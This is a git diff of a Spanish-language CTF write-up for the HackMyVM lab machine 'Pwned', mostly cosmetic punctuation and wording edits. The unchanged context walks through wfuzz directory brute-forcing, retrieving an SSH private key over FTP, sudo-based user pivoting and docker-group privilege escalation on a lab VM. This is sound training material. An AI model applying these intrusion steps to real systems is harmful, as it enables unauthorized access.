@@ -1,7 +1,9 @@
 ---
 layout: single
 title: Pwned - HackMyVM
-excerpt: "Hoy toca Pwned creada por Annlynn,una máquina linux de nivel fácil, con wfuzz encontraremos las credenciales de acceso al FTP, una vez en el FTP nos descargaremos un fichero id_rsa para conectarnos a la máquina. Después tendremos que hacer un user pivoting usando un archivo en bash y finalmente escalaremos privilegios mediante un exploit."
+excerpt: "Pwned es una máquina linux creada por annlynn, en está máquina veremos una enumeración de directorios con wfuzz, accederemos al servidor FTP con unas credenciales encontradas.
+ En el servidor FTP encotraremos una archivo id_rsa que usaremos para conectarnos a la máquina objetivo, una vez dentro haremos un user pivoting usando un archivo en bash
+ y finalmente escalaremos privilegios mediante un exploit."
 date: 2021-09-20
 classes: wide
 header:
@@ -11,12 +13,13 @@ header:
 categories:
   - hackmyvm
   - linux
-  - Annlynn
+
 tags:
   - hackmyvm
   - wfuzz
   - bash
   - docker
+  - annlynn
 ---
 
 ### Escaneo de puertos
@@ -53,7 +56,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ### Puerto 80 (HTTP)
 ![](/assets/images/hmvm-Pwned/web80.png)
 
-Si miramos el código fuente veremos un comentario con otro mensaje
+Si miramos el código fuente vemos que tenemos otro mensaje:
 ```html
 <!-- I forgot to add this on last note
      You are pretty smart as i thought 
@@ -82,7 +85,7 @@ Usamos de nuevo curl con html2text para ver el contenido del directorio `/nothin
      Apache/2.4.38 (Debian) Server at 192.168.1.54 Port 80
 ```
 
-El archivo `nothing.html` tampoco tiene nada
+El archivo `nothing.html` tampoco tiene nada.
 ```bash
 ❯ curl -s http://192.168.1.54/nothing/nothing.html | html2text
 
@@ -90,9 +93,9 @@ El archivo `nothing.html` tampoco tiene nada
 ```
 
 ### Wfuzz
-wfuzz encuentra varios directorios entre ellos `/nothing` y `/hidden_text`, `/nothing` ya lo vimos anteriormente pero `/hidden_text` es sospechoso 
+wfuzz encuentra varios directorios entre ellos `/nothing` y `/hidden_text`, `/nothing` ya lo vimos anteriormente pero `/hidden_text` es sospechoso.
 ```bash
-❯ wfuzz -c -t 50 --hc=404 -w /opt/w/directory-list-2.3-medium.txt http://192.168.1.54/FUZZ
+❯ wfuzz -c -t 200 --hc=404 -w /opt/w/directory-list-2.3-medium.txt http://192.168.1.54/FUZZ
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -109,14 +112,14 @@ ID           Response   Lines    Word       Chars       Payload
 000206056:   301        9 L      28 W       318 Ch      "hidden_text"
 ```
 
-### Directorio hidden_text
+### Directorio hidden_text:
 ![](/assets/images/hmvm-Pwned/secret.png)
 
-El archivo secret.dic es un diccionario de directorios
+El archivo secret.dic es un diccionario de directorios.
 
 ![](/assets/images/hmvm-Pwned/secretDic.png)
 
-Nos descargamos el diccionario
+Nos descargamos el diccionario.
 ```bash
 ❯ wget http://192.168.1.54/hidden_text/secret.dic
 --2021-09-20 15:51:22--  http://192.168.1.54/hidden_text/secret.dic
@@ -146,7 +149,7 @@ ID           Response   Lines    Word       Chars       Payload
 Vamos a `http://192.168.1.54/pwned.vuln/` y vemos lo siguiente:
 ![](/assets/images/hmvm-Pwned/pwnedvuln.png)
 
-Observamos esto en el código fuente de la web
+Observamos esto en el código fuente de la web.
 
 ![](/assets/images/hmvm-Pwned/cfuenteweb.png)
 
@@ -168,7 +171,7 @@ ftp>
 Una vez logueados, vemos un dicrectorio llamado `/share` dentro de `/share` vemos los siguientes archivos:
 ![](/assets/images/hmvm-Pwned/ftp.png)
 
-Los descargamos con get
+Los descargamos con get.
 ```bash
 ftp> get id_rsa 
 local: id_rsa remote: id_rsa
@@ -190,7 +193,7 @@ Damos permisos al `id_rsa` y nos conectamos al `SSH`
 ```
 
 ### pwned
-Una vez conectados como ariana leemos la flag de user1
+Una vez conectados como ariana leemos la flag de user1.
 ```bash
 ariana@pwned:~$ cat user1.txt 
 congratulations you Pwned ariana 
@@ -201,7 +204,7 @@ fb8d98be1xxxxxxxxxxxxxxxxx2140
 
 Try harder.need become root
 ```
-Leemos el fichero ariana-personal.diary
+Leemos el fichero ariana-personal.diary.
 
 ```
 ariana@pwned:~$ cat ariana-personal.diary 
@@ -237,12 +240,12 @@ ariana@pwned:~$ sudo -u selena /home/messenger.sh
 ```
 ![](/assets/images/hmvm-Pwned/aritoselena.png)
 
-Tenemos una shell con selena pero no es funcional del todo, para arreglar este pequeño problema
+Tenemos una shell con selena pero no es funcional del todo. Para arreglar este pequeño problema escribiremos:
 ```bash
 script /dev/null -c bash
 ```
 
-Nos vamos al home de selena y allí podemos leer el user2
+Nos vamos al home de selena y allí podemos leer el user2.
 ```bash
 selena@pwned:~$ cat user2.txt 
 711fxxxxxxxxxxxxxxxxxxxxf295c176
@@ -253,7 +256,7 @@ Try harder to catch me
 ```
 
 ### Privesc
-con id vemos que selena está en el grupo de docker
+con id vemos que selena está en el grupo de docker.
 ```bash
 selena@pwned:~$ id
 uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
